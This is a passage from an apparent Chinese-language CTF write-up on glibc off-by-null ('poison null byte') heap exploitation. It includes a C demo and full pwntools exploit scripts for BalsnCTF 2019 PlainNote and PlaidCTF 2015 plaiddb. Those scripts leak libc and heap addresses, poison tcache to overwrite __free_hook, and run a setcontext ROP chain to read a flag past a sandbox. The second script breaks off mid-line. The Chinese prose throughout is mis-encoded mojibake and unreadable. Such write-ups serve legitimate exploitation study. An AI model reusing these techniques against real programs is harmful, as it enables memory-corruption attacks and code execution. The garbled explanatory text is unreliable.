class="hljs-number">0x4f0</span>);<br>((<span class="hljs-type">char</span> *)victim2)[<span class="hljs-number">-8</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-comment">/* VULNERABILITY */</span><br><br><span class="hljs-type">void</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">memset</span>(merged, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">memset</span>(prev2, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">0x80</span>);<br><br>assert(<span class="hljs-built_in">strstr</span>(merged, <span class="hljs-string">&quot;CCCCCCCCC&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure>ä¸ºäº†ç»•å¼€æ–°åŠ çš„presizeçš„æ£€æŸ¥ï¼Œæˆ‘ä»¬å°±è¦ä¿è¯off by nullçš„æ—¶å€™åªè¦†ç›–preinuseä½ï¼Œå³sizeè¦ä¿è¯0x100å¯¹é½ä¸”ä¸å­˜åœ¨chunkå †å—çš„é”™ä½ã€‚é‚£ä¹ˆä¸‹ä¸€æ­¥æˆ‘ä»¬å°±éœ€è¦ç»•å¼€unlinkå¯¹äºchunkå‰åè¿æ¥çš„çš„æ£€æŸ¥    </li><li>æˆ‘ä»¬è¦å¸ƒç½®çš„è¿æ¥åœ¨unsorted binä¸­çš„fake chunkå°±æ˜¯prev+0x10ï¼Œé‚£ä¹ˆprevçš„fd_nextsizeå’Œbk_nextsizeå°±æ˜¯fake chunkçš„fdå’Œbkã€‚éœ€è¦fd_nextsizeå’Œbk_nextsizeæœ‰æ•ˆå°±å¾—å°†prevæ”¾è¿›large bin<img src="/2023/02/04/poison-null-byte/1-1.jpg" class title="æ­¥éª¤ä¸€"></li><li>ä»¥ä¸Šæ­¥éª¤å®Œæˆåfake chunkçš„fdå’Œbkå¸ƒç½®å®Œæ¯•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡large binå°†chunkåœ°å€å†™å…¥aå’Œbï¼Œç”±äºæˆ‘ä»¬ä¹‹å‰å·²ç»ä¿è¯äº†prevçš„åœ°å€å¯¹é½0x1000ï¼Œå› æ­¤ç”³è¯·å›aå’Œbå†è¦†ç›–ä¸¤å­—èŠ‚å°±èƒ½å®Œæˆfake chunkçš„è¿æ¥<img src="/2023/02/04/poison-null-byte/1-2.jpg" class title="æ­¥éª¤äºŒ"><img src="/2023/02/04/poison-null-byte/1-3.jpg" class title="æ­¥éª¤ä¸‰"></li><li>off by nullè§¦å‘victimçš„å‘ä¸‹åˆå¹¶ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡prev2æ§åˆ¶victim2çš„å¤´éƒ¨<img src="/2023/02/04/poison-null-byte/1-4.jpg" class title="æ­¥éª¤å››"></li></ul><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="BalsnCTF-2019-PlainNoteï¼ˆ2-29ï¼‰"><a href="#BalsnCTF-2019-PlainNoteï¼ˆ2-29ï¼‰" class="headerlink" title="BalsnCTF 2019-PlainNoteï¼ˆ2.29ï¼‰"></a>BalsnCTF 2019-PlainNoteï¼ˆ2.29ï¼‰</h2><p>é«˜ç‰ˆæœ¬çš„off by nullï¼Œåšçš„æ˜¯çœŸåç‰¢ï¼Œä½†æ”¶è·ä¹Ÿä¸å°‘ã€‚æ²¡æ‰¾åˆ°2.29çš„libcæ‰€ä»¥ç”¨çš„2.31</p><h3 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><p>é€†å‘ä¸éš¾ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯addå‡½æ•°ä¸­å­˜åœ¨off by nullæ¼æ´ï¼Œä¼šåœ¨è¾“å…¥æœ€ååŠ ä¸€ä¸ªç©ºå­—ç¬¦ï¼Œåœ¨å­˜åœ¨æ¼æ´çš„åŒæ—¶ä¹Ÿä½¿æ³„éœ²åœ°å€å˜å¾—å›°éš¾</p><img src="/2023/02/04/poison-null-byte/add.png" class title="add"><p>ä»¥åŠæœ¬é¢˜å­˜åœ¨æ²™ç®±ï¼Œéœ€è¦ç”¨orwè¯»å–flag</p><p>æ²™ç®±æ˜¯ç™½åå•å½¢å¼çš„ï¼Œåªå…è®¸readã€writeã€openå’Œexitçš„ç³»ç»Ÿè°ƒç”¨ï¼Œç¨‹åºä¸­æ‰€æœ‰çš„è¾“å…¥è¾“å‡ºéƒ½æ˜¯é€šè¿‡readå’Œwriteå®ç°çš„</p><img src="/2023/02/04/poison-null-byte/myputs.png" class title="myputs"><img src="/2023/02/04/poison-null-byte/myprintf.png" class title="myprintf"><img src="/2023/02/04/poison-null-byte/readint.png" class title="readint"><p>è¾“å‡ºä¼šç”¨strlenå–è¾“å‡ºçš„å­—èŠ‚æ•°ï¼Œè€Œstrlenæ˜¯é€šè¿‡ç©ºå­—ç¬¦ç¡®å®šé•¿åº¦çš„ï¼Œæ‰€ä»¥ä¸å¯èƒ½é€šè¿‡è¿å¸¦çš„æ–¹å¼æ³„éœ²åœ°å€</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>ä¸»è¦æµç¨‹æœ‰å››æ­¥ï¼š</p><ul><li>æ³„éœ²libcåŸºå€</li><li>æ³„éœ²heapåœ°å€</li><li>æ‰§è¡Œoff by null</li><li>è¿›è¡Œorw<br>æ‰§è¡Œoff by nullæŒ‰ç…§å®éªŒä»£ç æ‰§è¡Œå°±è¡Œï¼Œorwç”¨gadget+setcontextæ¨¡æ¿å°±è¡Œï¼Œä¸»è¦éš¾ç‚¹åœ¨äºæ³„éœ²åœ°å€ï¼Œæ‰€ä»¥off by nullçš„æ­¥éª¤å¾—è¿›è¡Œä¸€å®šçš„æ”¹è¿›<br>ç”±äºå †çš„åŸºå€ä¼šä¿æŒé¡µå¯¹é½å³0x1000å¯¹é½ï¼Œä½†è¿›è¡Œbâ€™\x00\x10â€™è¦†ç›–æ—¶ä¼šæŠŠç¬¬å››ä½ä¹Ÿè¦†ç›–ä¸º0ï¼Œæ‰€ä»¥åªæœ‰å½“æˆ‘ä»¬çš„prev chunkçš„åœ°å€çš„ç¬¬å››ä½ä¸º0æ—¶æ‰èƒ½è¦†ç›–æˆåŠŸï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å¼€å¯aslrçš„æƒ…å†µä¸‹å­˜åœ¨ä¸€ä¸ª1&#x2F;16çš„çˆ†ç ´ï¼ˆæœ¬åœ°åšçš„æ—¶å€™å¯ä»¥å…ˆå…³é—­aslrï¼‰</li><li>ç”±äºinitå‡½æ•°ä¼šä½¿heapéå¸¸çš„æ··ä¹±æ‰€ä»¥å¯ä»¥å…ˆæŠŠbinæ¸…ç©º<img src="/2023/02/04/poison-null-byte/init.png" class title="init"></li><li>é¦–å…ˆåœ¨æœ€å¼€å§‹å †å¸ƒå±€çš„æ—¶å€™prevä¸Šå†åŠ ä¸¤ä¸ª0x20çš„chunkï¼Œè¿™æ ·off by nullä¹‹åçš„å †å¸ƒå±€å¦‚ä¸‹æ‰€ç¤ºï¼š<img src="/2023/02/04/poison-null-byte/2-1.jpg" class title="æ­¥éª¤ä¸€">å…¶ä¸­prev3ç”¨äºoff by nullæ›´æ”¹victimçš„presizeå’Œpreinuseï¼Œprev2ç”¨äºæ³„éœ²</li><li>åœ¨off by nullç»“æŸä¹‹åç”³è¯·ä¸€ä¸ª0x4f0çš„chunkï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½é€šè¿‡prev2åˆ©ç”¨showå‡½æ•°æ‰“å°fdæŒ‡é’ˆ<br>ç”±äºæˆ‘ä»¬éœ€è¦æ³„éœ²libcåŸºå€å’Œheapä¸¤ä¸ªåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆç”³è¯·å›0x530çš„chunkï¼Œç„¶åé‡Šæ”¾ä¸€ä¸ªunsorted binèŒƒå›´çš„chunkï¼ˆpadï¼‰ï¼Œå†é‡Šæ”¾0x530çš„chunkï¼Œè¿™æ ·prev2çš„fdæŒ‡å‘ä¸€ä¸ªheapåœ°å€padï¼Œå†ç”³è¯·å›padï¼Œprev2çš„fdå°±æŒ‡å‘unsorted bin<img src="/2023/02/04/poison-null-byte/2-2.jpg" class title="æ­¥éª¤äºŒ"></li><li>ç„¶åæˆ‘ä»¬å¯å¯ä»¥ä»prev2ä¸­å†åˆ‡ä¸‹æ¥ä¸€ä¸ªtcacheèŒƒå›´å†…çš„chunkï¼Œé€šè¿‡æ‰“tcacheæ‰§è¡Œorw</li><li>orwæ—¶éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œç›´æ¥æ‰§è¡Œopenå‡½æ•°æ—¶å®é™…è°ƒç”¨çš„syscallæ˜¯0x101ï¼Œä¼šè¢«æ²™ç®±banæ‰<img src="/2023/02/04/poison-null-byte/open.png" class title="open">æ‰€ä»¥è¦é€šè¿‡raxè¿›è¡Œsyscallï¼Œè¿™é‡Œé€‰ç”¨çš„æ˜¯timeå‡½æ•°å’Œtimelocalå‡½æ•°ä¸­é—´çš„sub_D3F40<img src="/2023/02/04/poison-null-byte/syscall.png" class title="syscall"></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;Choice: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;Choice: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;Choice: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>p=process(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<span class="hljs-comment">#0-15</span><br>    add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<span class="hljs-comment">#16-31</span><br>    add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<span class="hljs-comment">#32-40</span><br>    add(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<span class="hljs-comment">#41-45</span><br>    add(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<span class="hljs-comment">#46-47</span><br>    add(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">0xcf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#48</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev_1(49)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev_2(50)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev_3(51)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#victim(52)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(53)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#a(54)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(55)</span><br>add(<span class="hljs-number">0x510</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#b(56)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(57)</span><br>remove(<span class="hljs-number">49</span>)<br>remove(<span class="hljs-number">54</span>)<br>remove(<span class="hljs-number">56</span>)<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#49</span><br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(58)</span><br>add(<span class="hljs-number">0x500</span>,p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\x41\x05\x00\x00\x00\x00\x00&#x27;</span>)<span class="hljs-comment">#prev1_1(54)</span><br>add(<span class="hljs-number">0x510</span>,<span class="hljs-string">b&#x27;\x10&#x27;</span>)<span class="hljs-comment">#b2(56)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#a2(59)</span><br>remove(<span class="hljs-number">59</span>)<br>remove(<span class="hljs-number">52</span>)<br>add(<span class="hljs-number">0x4f0</span>,p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\x10&#x27;</span>)<span class="hljs-comment">#a3(52)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<span class="hljs-comment">#victim2(59)</span><br>remove(<span class="hljs-number">51</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x540</span>))<span class="hljs-comment">#prev1_2(51)</span><br>gdb.attach(p)<br>remove(<span class="hljs-number">59</span>)<br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev1_1(59)</span><br>add(<span class="hljs-number">0x530</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#60</span><br>remove(<span class="hljs-number">49</span>)<br>remove(<span class="hljs-number">60</span>)<br>show(<span class="hljs-number">50</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=u64(s)-<span class="hljs-number">0x14d0</span>+<span class="hljs-number">0xa80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap:&quot;</span>,<span class="hljs-built_in">hex</span>(heap))<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>show(<span class="hljs-number">50</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span>-<span class="hljs-number">96</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libcbase:&quot;</span>,<span class="hljs-built_in">hex</span>(libcbase))<br>add(<span class="hljs-number">0x530</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x20</span>))<span class="hljs-comment">#60</span><br>remove(<span class="hljs-number">53</span>)<br>remove(<span class="hljs-number">51</span>)<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>remove(<span class="hljs-number">60</span>)<br>add(<span class="hljs-number">0x530</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x20</span>)+p64(free_hook))<br>remove(<span class="hljs-number">52</span>)<span class="hljs-comment">#a3(orw)</span><br>gadget=libcbase+<span class="hljs-number">0x1547a0</span><br>setcontext_addr=libcbase+<span class="hljs-number">0x580dd</span><br>ret_addr=libcbase+<span class="hljs-number">0x25679</span><br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi_addr=libcbase+<span class="hljs-number">0x26b72</span><br>pop_rsi_addr=libcbase+<span class="hljs-number">0x27529</span><br>pop_rdx_r12_addr=libcbase+<span class="hljs-number">0x11c1e1</span><br>pop_rax_addr=libcbase+<span class="hljs-number">0x4a550</span><br>syscall_addr=libcbase+<span class="hljs-number">0xd3f49</span><br>payload=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(heap)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(setcontext_addr)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x28</span>)+p64(heap+<span class="hljs-number">0x100</span>)+p64(ret_addr)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>)<br>payload+=p64(pop_rdi_addr)+p64(heap)+p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(pop_rax_addr)+p64(<span class="hljs-number">2</span>)+p64(syscall_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x300</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(read_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x300</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(write_addr)<br>add(<span class="hljs-number">0x4f0</span>,payload)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(gadget))<br><span class="hljs-comment">#gdb.attach(p)</span><br>remove(<span class="hljs-number">52</span>)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-comment">#gdb.attach(p)</span><br>pause()<br></code></pre></td></tr></table></figure><h2 id="PlaidCTF-2015-plaiddbï¼ˆ2-19ï¼‰"><a href="#PlaidCTF-2015-plaiddbï¼ˆ2-19ï¼‰" class="headerlink" title="PlaidCTF 2015-plaiddbï¼ˆ2.19ï¼‰"></a>PlaidCTF 2015-plaiddbï¼ˆ2.19ï¼‰</h2><p>ä½ç‰ˆæœ¬çš„off by nullï¼Œå¿˜è®°äº†æœ‰ä¸ªä¸œè¥¿å«äºŒå‰æ ‘æ˜¯æˆ‘çš„é”™(<em>^_^</em>)ï¼Œç”±äºæ˜¯2015å¹´çš„é¢˜æ‰€ä»¥2.19çš„libcå¤šå°‘æœ‰ç‚¹ç¦»è°±äº†ï¼Œç”¨çš„2.23çš„libc</p><h3 id="é€†å‘-1"><a href="#é€†å‘-1" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><p>åœ¨ä¸éœ€è¦ç†ä¼šå¹³è¡¡æ ‘çš„å…·ä½“ç®—æ³•çš„æƒ…å†µä¸‹åªéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œè¯»å…¥keyçš„sub_1040å‡½æ•°ä¸­å­˜åœ¨off by nullæ¼æ´</p><img src="/2023/02/04/poison-null-byte/get_key.png" class title="get_key"><p>reallocçš„å¤§è‡´é€»è¾‘æ˜¯å¦‚æœå †å—èƒ½å¤Ÿå‘ä¸Šæ‹“å±•çš„è¯å°±å‘ä¸Šæ‹“å±•ï¼Œå¦‚æœä¸èƒ½ï¼Œå°±é‡æ–°åˆ†é…å †å—</p><h3 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>ç”±äºç¨‹åºä¼šç”³è¯·ä¸€äº›0x20å’Œ0x40çš„å †å—ä½œä¸ºkeyå’Œchunkï¼Œè¿™æ ·ä¼šä½¿heapç»“æ„å˜å¾—å¤æ‚ï¼Œæ‰€ä»¥å¯ä»¥å…ˆç”³è¯·ä¸€äº›å¤‡ç”¨</p><img src="/2023/02/04/poison-null-byte/small_chunk.png" class title="small_chunk"><p>è¿™æ ·æˆ‘ä»¬è¿›è¡Œåˆ©ç”¨çš„å°±åªæ˜¯ç”¨äºdataçš„å †å—äº†ï¼Œç”±äºdataçš„å¤§å°æ˜¯å¯æ§çš„æ‰€ä»¥è¿™æ ·åˆ©ç”¨èµ·æ¥æ›´åŠ æ–¹ä¾¿</p><img src="/2023/02/04/poison-null-byte/heap.png" class title="heap"><p>ç”±äºè¦åˆ©ç”¨keyçš„off by nullï¼Œæ‰€ä»¥å¯ä»¥å…ˆé‡Šæ”¾ä¸€ä¸ªdataå†å ç”¨è¿™ä¸ªåœ°å€çš„chunkä½œä¸ºkey<br>å…¶ä½™æ­¥éª¤å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œç”³è¯·å…­ä¸ªå †å—ï¼Œé è¿‘top chunkçš„chunkç”¨äºé˜²åˆå¹¶ï¼Œé¦–å°¾ä¸¤ä¸ªchunkç”¨äºè§¦å‘unsorted binå‘ä¸‹åˆå¹¶ï¼Œä¸­é—´0x70çš„chunkç”¨äºfastbin attackï¼Œå‰©ä¸‹ä¸¤ä¸ªchunkä¸€ä¸ªç”¨äºæ³„éœ²libcï¼Œä¸€ä¸ªç”¨äºoff by null<br>psï¼šone_gadgetéƒ½ä¸å¯ç”¨ï¼Œéœ€è¦ç”¨reallocè°ƒæ•´æ ˆå†…å®¹</p><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put</span>(<span class="hljs-params">key,size,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;PUT&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter row key:\n&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter data size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;PROMPT: Enter data:\n&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;GET&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter row key:\n&#x27;</span>,key)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;DUMP&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">key</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;DEL&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter row key:\n&#x27;</span>,key)<br><br>p=process(<span class="hljs-string">&#x27;./datastore.elf&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    put(<span class="hljs-built_in">str</span>(i),<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    delete(<span class="hljs-built_in">str</span>(i))<br>put(<span class="hljs-string">b&#x27;1&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#unsorted bin</span><br>put(<span 